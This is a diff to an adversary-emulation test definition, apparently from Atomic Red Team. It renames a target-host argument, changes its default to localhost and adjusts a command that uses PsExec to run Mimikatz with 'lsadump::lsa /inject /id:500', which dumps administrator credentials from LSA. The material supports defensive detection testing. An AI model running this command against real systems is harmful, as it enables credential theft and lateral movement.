@@ -53,10 +53,10 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
-    machine:
+    remote_host:
       description: machine to target (via psexec)
       type: string
-      default: DC1
+      default: localhost
     mimikatz_path:
       description: Mimikatz windows executable
       type: path
@@ -93,7 +93,7 @@ atomic_tests:
       Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_path}" -Force
   executor:
     command: |
-      "#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
+      #{psexec_path} /accepteula \\#{remote_host} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
     name: command_prompt
     elevation_required: false # locally not, but remotely on target machine then yes
 - name: Section View Injection
